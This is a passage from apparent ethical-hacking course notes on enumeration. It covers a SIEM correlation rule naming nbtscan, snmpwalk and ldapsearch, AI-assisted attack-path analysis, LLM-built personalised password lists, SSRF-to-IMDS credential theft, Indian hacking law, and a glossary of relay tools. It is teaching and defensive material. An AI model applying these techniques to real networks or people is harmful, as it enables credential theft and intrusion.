> **High-confidence SIEM rule:** Correlate T1018 (NetBIOS) + T1046 (SNMP) + T1087 (LDAP query) from the SAME SOURCE IP within 30 MINUTES. A legitimate admin wouldn't simultaneously run nbtscan, snmpwalk, and ldapsearch in one window. This correlated pattern is far more reliable than alerting on any single technique.

---

## Section 6 — 2026 Context

### 6.1 AI-Assisted Enumeration

| Development | Detail |
|---|---|
| **BloodHound CE + AI** | After LDAP dump, AI engine automatically: identifies shortest path to Domain Admin, highlights choke-point accounts, ranks paths by "time to DA" estimate, suggests which Kerberoastable account to target first. Hours of manual graph analysis → seconds. |
| **LLM-Powered Credential Lists** | Feed LDAP enumeration data to LLM: "Generate 500 likely passwords for John Smith, finance manager at Corp Inc, Mumbai, joined 2019, dog named Bruno." Output: hyper-personalized wordlist. LDAP enum + LLM = significantly more effective than generic wordlists. |
| **AI-Powered SNMP Correlation** | MIB data from multiple devices auto-correlated to produce topology maps, identify default community strings, prioritize targets by traffic and connected device count. |

---

### 6.2 Cloud Environments and Enumeration

#### Azure AD (Microsoft Entra ID)

| Aspect | Detail |
|---|---|
| **No direct LDAP** | Azure AD uses REST APIs (MS Graph) |
| **But similar exposure** | Low-privilege OAuth token via MS Graph still exposes all users, groups, applications, roles |
| **Tool** | AADInternals (2024–2026) enumerates via MS Graph and Azure management APIs |
| **Key finding** | Azure AD guest accounts can often enumerate the entire tenant's user list by default |

#### AWS IMDS Enumeration

| Aspect | Detail |
|---|---|
| **What** | Instance Metadata Service (169.254.169.254) replaces some traditional enumeration |
| **Attack** | SSRF vulnerability → IMDS query → IAM role credentials |
| **Reference** | Capital One breach 2019: SSRF → IMDS → IAM creds → 100 million records stolen |
| **Mitigation** | IMDSv2 (2019+) requires PUT pre-flight — partially mitigates but SSRF chains still exist |

#### IP Spoofing in Cloud

Major cloud providers (AWS, Azure, GCP) implement BCP38 at the hypervisor level — spoofed packets from cloud VMs are blocked at the virtual NIC. Classic IP spoofing **cannot be launched** from cloud instances. However, on-premises networks and smaller hosting providers still lack this filtering.

---

### 6.3 DPDPA 2023 and Enumeration Legality

| Law | Relevance to Enumeration |
|---|---|
| **DPDPA 2023** | LDAP enumeration extracts personal data (names, emails, phones, departments). Unauthorized extraction = data breach. Penalty: up to **₹250 crore** per incident. |
| **IT Act 2000 S. 43(a)** | Querying SNMP on unauthorized systems = "accessing a computer system without permission." Civil liability. |
| **IT Act 2000 S. 66** | Criminal version — imprisonment up to 3 years and/or fine up to ₹5 lakh for hacking offenses. |

> [!WARNING]
> Every enumeration technique in this session requires **explicit written authorization** from the system owner before execution. The protocol being public does not make querying unauthorized systems legal.

---

### ✅ Session 11B — Key Takeaways

- [x] IP spoofing exists because the IPv4 Source IP field is a 4-byte value any raw socket can set — no protocol-level validation
- [x] Blind spoofing = never see replies (useful for DoS amplification). Non-blind on LAN = session hijacking
- [x] BCP38 egress filtering is the fundamental prevention — but ~25% of internet ASes still don't implement it
- [x] Enumeration ≠ scanning: scanning finds open ports; enumeration extracts the DATA those ports voluntarily provide
- [x] NetBIOS type code `[20]` = file sharing active; `[1C]` = Domain Controllers present; `[1B]` = Master Browser
- [x] SNMP with default "public" exposes routing tables, ARP caches, user accounts — one snmpwalk can map an entire network
- [x] LDAP enumeration with any valid domain user reveals ALL users, groups, computers, DCs, service accounts
- [x] DNS zone transfer (AXFR) delivers complete internal hostname-to-IP mapping in one query
- [x] NTLM transmits a challenge-response pair, never the password — this enables relay without cracking
- [x] SMB Relay intercepts NTLM auth (via NBNS/LLMNR spoofing) and replays it to a different server in real time — no password needed
- [x] SMB Relay requires SMB Signing DISABLED on target. Enabling SMB Signing on ALL machines prevents relay.
- [x] Disabling LLMNR (GPO) and NetBIOS over TCP/IP eliminates the broadcast channels spoofing relies on
- [x] NetBIOS DoS disrupts name resolution network-wide — causing mapped drive failures, auth disruption, operational chaos
- [x] BloodHound CE + AI in 2026 automates LDAP-to-Domain-Admin attack path calculation in seconds
- [x] IP spoofing from major cloud providers (AWS, Azure, GCP) is prevented at the hypervisor level

---

<details>
<summary>📖 Session 11B — Glossary</summary>

| Term | Definition |
|---|---|
| IP Spoofing | Forging the Source IP address in an IP packet header to impersonate another host |
| Blind Spoofing | Spoofing where attacker can't see replies — used for DoS and one-way injections |
| Non-Blind Spoofing | Spoofing on a LAN where attacker can observe traffic, enabling session hijacking |
| BCP38 | RFC 2827 — ISPs drop packets whose source IP isn't in originating AS's address space |
| uRPF | Unicast Reverse Path Forwarding — router validates source IP against routing table |
| Raw Socket | Low-level socket bypassing OS kernel's automatic header filling — allows custom source IP |
| Enumeration | Active connections to target services extracting usernames, shares, routing tables, AD structure |
| NetBIOS | 1983 networking API: Name Service (UDP 137), Datagram (UDP 138), Session (TCP 139) |
| NBNS | NetBIOS Name Service — UDP 137. Name registration and resolution on local subnets via broadcast |
| NetBIOS Type Code | 16th byte of NetBIOS name: [20]=File Server, [1C]=Domain Controllers, [00]=Workstation |
| NULL Session | Anonymous unauthenticated connection to Windows IPC$ share. Disabled from Vista onwards. |
| SNMP | Simple Network Management Protocol — UDP 161 (agent), 162 (trap). v1/v2c insecure, v3 secure |
| Community String | SNMP auth (v1/v2c). Plain-text password. Default: "public" (read), "private" (write) |
| MIB | Management Information Base — structured database of all SNMP-accessible variables |
| OID | Object Identifier — hierarchical numerical path for SNMP variables |
| snmpwalk | Command-line tool iteratively querying all OIDs in a MIB tree |
| LDAP | Lightweight Directory Access Protocol — queries Active Directory. TCP 389/636 |
| Active Directory | Microsoft's directory service storing all user, computer, group, GPO objects |
| Distinguished Name (DN) | Unique LDAP path: CN=name,OU=unit,DC=domain,DC=com |
| Anonymous LDAP Bind | Connecting to LDAP without credentials — permitted by some misconfigured AD environments |
| BloodHound | AD relationship mapping tool computing attack paths from any account to Domain Admin |
| AXFR | DNS Authoritative Transfer — complete zone copy. Reveals all hostnames and IPs. |
| DNS Zone Transfer | Copying entire DNS zone database using AXFR query |
| NTLM | NT LAN Manager — Microsoft's challenge-response auth. NTLMv2 uses HMAC-MD5. |
| NT Hash | MD4(Unicode(password)) — stored in SAM/NTDS.DIT, used in NTLM challenge-response |
| NTLM Challenge | 8-byte random value from server. Client signs it with NT hash to prove identity. |
| SMB Redirection | Tricking Windows into sending NTLM auth to attacker via NBNS/LLMNR spoofing |
| NBNS Spoofing | Responding to NetBIOS broadcasts with false info (attacker's IP). Tool: Responder |
| LLMNR | Link-Local Multicast Name Resolution — UDP 5355. Windows fallback when DNS fails. Same spoofing risk. |
| Responder | Linux tool for NBNS/LLMNR/WPAD spoofing and NTLM hash capture |
| SMB Relay | Intercepting NTLM auth and replaying to different server in real time — no password needed |
| ntlmrelayx.py | Impacket suite tool for SMB Relay. Relays auth and optionally dumps SAM. |
| SMB Signing | Cryptographic signing of SMB packets with session key. Prevents SMB Relay. |
| SAM Database | Security Account Manager — Windows database storing local user NT hashes |
| NBNS DoS | Flooding network with false NBNS responses causing Windows name resolution failure |
| Amplification Attack | DDoS variant: small spoofed requests to reflectors generate large responses at victim |
| Microsoft Defender for Identity | Cloud-based identity threat detection monitoring LDAP, auth patterns, lateral movement |

</details>

---

**What's next — Session 11C** covers password cracking techniques (dictionary, brute force, hybrid, rule-based), cracking Windows passwords (SAM database, NT hash extraction, LM hash weaknesses), and how captured NTLM hashes from SMB Relay are cracked offline.

**The chain so far:**
- 11A: What is running + how to hide
- 11B: Who is there + capture their credentials
- **11C: Crack the captured credentials → become them**
- 11D: Overwhelm if needed → disrupt as cover or goal

---